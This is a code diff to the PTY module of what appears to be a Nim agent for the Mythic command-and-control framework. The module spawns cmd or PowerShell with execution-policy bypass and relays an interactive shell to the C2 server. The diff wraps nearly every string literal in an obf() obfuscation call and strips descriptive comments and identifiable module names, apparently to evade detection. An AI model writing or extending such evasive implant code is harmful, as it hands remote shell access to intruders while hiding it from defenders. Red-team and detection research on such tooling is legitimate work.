@@ -1,10 +1,7 @@
-## PTY (Pseudo Terminal) task for interactive shell sessions
-## Spawns a program with PTY and handles interactive I/O with Mythic
-## Uses threads for non-blocking I/O with raw OS handles
-
-import std/[json, os, osproc, strutils, base64, times, strformat]
-import ../config
-import ../utils/mythic_responses
+import std/[json, os, osproc, strutils, base64, strformat]
+import ../utils/m_responses
+import ../utils/debug
+import ../utils/strenc
 
 when defined(windows):
   import winim/lean
@@ -137,31 +134,28 @@ else:
 proc createInteractiveMessage*(taskId: string, msgType: PtyMessageType, data: string): JsonNode =
   ## Create an interactive message to send to Mythic
   result = %*{
-    "task_id": taskId,
-    "message_type": ord(msgType),
-    "data": encode(data)
+    obf("task_id"): taskId,
+    obf("message_type"): ord(msgType),
+    obf("data"): encode(data)
   }
 
 proc pty*(taskId: string, params: JsonNode): JsonNode =
   ## Start a PTY session with the specified program
-  let cfg = getConfig()
-  
   try:
     # Parse parameters
-    let program = params["program"].getStr()
+    let program = params[obf("program")].getStr()
     
-    if cfg.debug:
-      echo &"[DEBUG] Starting PTY with program: {program}"
+    debug &"[DEBUG] Starting PTY with program: {program}"
     
     # Determine program arguments based on type
     var args: seq[string] = @[]
     let progLower = program.toLowerAscii()
     
     when defined(windows):
-      if "cmd" in progLower:
-        args = @["/Q", "/D"]
-      elif "powershell" in progLower or "pwsh" in progLower:
-        args = @["-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass"]
+      if obf("cmd") in progLower:
+        args = @[obf("/Q"), obf("/D")]
+      elif obf("powershell") in progLower or obf("pwsh") in progLower:
+        args = @[obf("-NoLogo"), obf("-NoProfile"), obf("-ExecutionPolicy"), obf("Bypass")]
     else:
       # For Linux shells, use non-interactive mode for cleaner output
       discard
@@ -209,23 +203,19 @@ proc pty*(taskId: string, params: JsonNode): JsonNode =
     
     activePtySessions.add(session)
     
-    if cfg.debug:
-      echo &"[DEBUG] PTY session started for task {taskId} with background thread"
+    debug &"[DEBUG] PTY session started for task {taskId} with background thread"
     
     # Return initial response indicating we're ready for interaction
-    result = mythicSuccess(taskId, &"Interacting with program: {program}\n")
-    result["completed"] = %false
-    result["status"] = %"processing"
+    result = mythicSuccess(taskId, obf("PTY session started successfully") & obf(" with program: ") & program)
+    result[obf("completed")] = %false
+    result[obf("status")] = %obf("processing")
     return result
     
   except:
     let e = getCurrentException()
-    return mythicError(taskId, &"Error starting PTY: {e.msg}")
+    return mythicError(taskId, obf("Error starting PTY: ") & e.msg)
 
 proc handlePtyInteractive*(taskId: string, interactive: seq[JsonNode]): JsonNode =
-  ## Handle interactive messages for PTY sessions
-  let cfg = getConfig()
-  
   # Find the session for this task
   var session: PtySession = nil
   for s in activePtySessions:
@@ -235,10 +225,10 @@ proc handlePtyInteractive*(taskId: string, interactive: seq[JsonNode]): JsonNode
   
   if session == nil:
     return %*{
-      "task_id": taskId,
-      "user_output": "Error: PTY session not found",
-      "completed": true,
-      "status": "error"
+      obf("task_id"): taskId,
+      obf("user_output"): obf("Error: PTY session not found"),
+      obf("completed"): %true,
+      obf("status"): "error"
     }
   
   var interactiveMessages: seq[JsonNode] = @[]
@@ -246,9 +236,9 @@ proc handlePtyInteractive*(taskId: string, interactive: seq[JsonNode]): JsonNode
   try:
     # Handle input messages
     for msg in interactive:
-      let msgType = PtyMessageType(msg["message_type"].getInt())
-      let data = if msg.hasKey("data") and msg["data"].kind != JNull:
-                  decode(msg["data"].getStr())
+      let msgType = PtyMessageType(msg[obf("message_type")].getInt())
+      let data = if msg.hasKey(obf("data")) and msg[obf("data")].kind != JNull:
+                  decode(msg[obf("data")].getStr())
                 else:
                   ""
       
@@ -256,34 +246,32 @@ proc handlePtyInteractive*(taskId: string, interactive: seq[JsonNode]): JsonNode
       of Input:
         # Send input to thread via channel
         if data.len > 0:
-          if cfg.debug:
-            echo &"[DEBUG] PTY input: {data}"
+          debug &"[DEBUG] PTY input: {data}"
           
           session.threadData[].inputChan[].send(data)
           
           # Check for exit command
           let inputLower = data.strip().toLowerAscii()
-          if inputLower == "exit" or inputLower == "exit\n":
+          if inputLower == obf("exit") or inputLower == obf("exit\n"):
             session.active = false
             session.threadData[].active = false
             session.process.terminate()
-            interactiveMessages.add(createInteractiveMessage(taskId, Output, "Exiting PTY session...\n"))
+            interactiveMessages.add(createInteractiveMessage(taskId, Output, obf("Exiting PTY session...\n")))
             return %*{
-              "task_id": taskId,
-              "interactive": interactiveMessages
+              obf("task_id"): taskId,
+              obf("interactive"): interactiveMessages
             }
       
       of Exit:
         # Terminate the PTY session
-        if cfg.debug:
-          echo &"[DEBUG] PTY exit requested"
+        debug &"[DEBUG] PTY exit requested"
         
         session.active = false
         session.threadData[].active = false
-        session.threadData[].inputChan[].send("exit\n")
+        session.threadData[].inputChan[].send(obf("exit\n"))
         sleep(100)
         session.process.terminate()
-        interactiveMessages.add(createInteractiveMessage(taskId, Output, "PTY session terminated\n"))
+        interactiveMessages.add(createInteractiveMessage(taskId, Output, obf("PTY session terminated\n")))
       
       of Escape, CtrlA, CtrlB, CtrlC, CtrlD, CtrlE, CtrlF, CtrlG, Backspace, Tab, 
          CtrlK, CtrlL, CtrlN, CtrlP, CtrlQ, CtrlR, CtrlS, CtrlU, CtrlW, CtrlY, CtrlZ:
@@ -324,11 +312,10 @@ proc handlePtyInteractive*(taskId: string, interactive: seq[JsonNode]): JsonNode
       if output.len == 0:
         # EOF signal from thread
         session.active = false
-        interactiveMessages.add(createInteractiveMessage(taskId, Exit, "Process terminated\n"))
+        interactiveMessages.add(createInteractiveMessage(taskId, Exit, obf("Process terminated\n")))
         break
       
-      if cfg.debug:
-        echo &"[DEBUG] PTY output: {output}"
+      debug &"[DEBUG] PTY output: {output}"
       
       interactiveMessages.add(createInteractiveMessage(taskId, Output, output))
       
@@ -340,7 +327,7 @@ proc handlePtyInteractive*(taskId: string, interactive: seq[JsonNode]): JsonNode
       session.active = false
       session.threadData[].active = false
       if interactiveMessages.len == 0:
-        interactiveMessages.add(createInteractiveMessage(taskId, Exit, "Process terminated\n"))
+        interactiveMessages.add(createInteractiveMessage(taskId, Exit, obf("Process terminated\n")))
       
       # Remove from active sessions
       var newSessions: seq[PtySession] = @[]
@@ -352,8 +339,8 @@ proc handlePtyInteractive*(taskId: string, interactive: seq[JsonNode]): JsonNode
     # Return response with interactive messages
     if interactiveMessages.len > 0:
       return %*{
-        "task_id": taskId,
-        "interactive": interactiveMessages
+        obf("task_id"): taskId,
+        obf("interactive"): interactiveMessages
       }
     else:
       return %*{}
@@ -363,10 +350,10 @@ proc handlePtyInteractive*(taskId: string, interactive: seq[JsonNode]): JsonNode
     session.active = false
     session.threadData[].active = false
     return %*{
-      "task_id": taskId,
-      "user_output": &"PTY error: {e.msg}",
-      "completed": true,
-      "status": "error"
+      obf("task_id"): taskId,
+      obf("user_output"): &"PTY error: {e.msg}",
+      obf("completed"): true,
+      obf("status"): "error"
     }
 
 proc checkActivePtySessions*(): seq[JsonNode] =
@@ -376,5 +363,5 @@ proc checkActivePtySessions*(): seq[JsonNode] =
   for session in activePtySessions:
     if session.active:
       let response = handlePtyInteractive(session.taskId, @[])
-      if response.hasKey("interactive"):
+      if response.hasKey(obf("interactive")):
         result.add(response)
